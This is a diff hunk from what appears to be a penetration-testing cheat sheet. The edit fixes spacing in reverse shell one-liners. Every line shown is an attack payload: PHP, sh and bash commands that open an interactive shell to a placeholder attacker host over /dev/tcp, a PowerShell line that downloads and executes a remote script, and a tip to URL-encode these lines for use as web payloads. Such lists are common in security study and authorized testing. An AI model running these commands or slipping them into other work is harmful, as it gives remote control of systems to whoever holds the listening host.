@@ -1102,8 +1102,8 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 ```shell
 php -r '$sock=fsockopen("IP_ATTACK",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 # or
-sh -i >& /dev/tcp/ IP_ATTACK/4444 0>&1
-bash -i >& /dev/tcp/ IP_ATTACK/4444 0>&1
+sh -i >& /dev/tcp/IP_ATTACK/4444 0>&1
+bash -i >& /dev/tcp/IP_ATTACK/4444 0>&1
 bash -c 'bash -i >& /dev/tcp/IP_ATTACK/666 0>&1'
 /bin/bash "/bin/bash -i 5<> /dev/tcp/IP_ATTACK/4444 0<&5 1>&5 2>&5"
 # or URL Encode the previous ones using CyberChef
